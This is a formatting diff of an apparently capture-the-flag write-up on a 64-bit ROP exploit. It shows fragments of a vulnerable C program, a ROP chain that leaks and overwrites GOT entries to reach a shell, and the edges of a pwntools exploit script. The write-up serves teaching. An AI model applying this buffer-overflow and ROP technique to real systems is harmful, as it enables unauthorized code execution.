@@ -6,12 +6,11 @@ title: basic_rop_x64
     The source code of the target program is as below.
 </p>
 
-{% raw %}
-<pre><code>
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;signal.h&gt;
-#include &lt;unistd.h&gt;
+{% highlight c %}
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
 
 
 void alarm_handler() {
@@ -38,19 +37,16 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 
 <p>As we can see, a buffer overflow can occur in main so we can craft an rop chain as follows. </p>
 
-{% raw %}
-<pre><code>
+{% highlight python %}
 rdi_gadget+p64(0x1)+rsi_gadget+p64(write_got_addr)+p64(0x2)+p64(write_plt) +
 rdi_gadget+p64(0x0)+rsi_gadget+p64(write_got_addr)+p64(0x2)+p64(read_plt) +
 rdi_gadget+p64(0x0)+rsi_gadget+p64(read_got_addr)+p64(0x2)+p64(read_plt) +
 rdi_gadget+p64(read_got_addr)+rsi_gadget+p64(read_got_addr+8)+p64(0x2) + p64(write_plt)
-</code></pre>
-{% endraw %}
+{% endhighlight %}
 
 {% raw %}
 <p>
@@ -67,8 +63,7 @@ the address to an array that contains the address to "/bin/sh" and NULL will be 
 {% endraw %}
 <p> The exploit code is as below. </p>
 
-{% raw %}
-<pre><code>
+{% highlight python %}
 #!/usr/bin/python3
 from pwn import *
 
@@ -116,5 +111,4 @@ def exploit():
 
 
 if __name__ == "__main__": exploit()
-</code></pre>
-{% endraw %}
+{% endhighlight %}
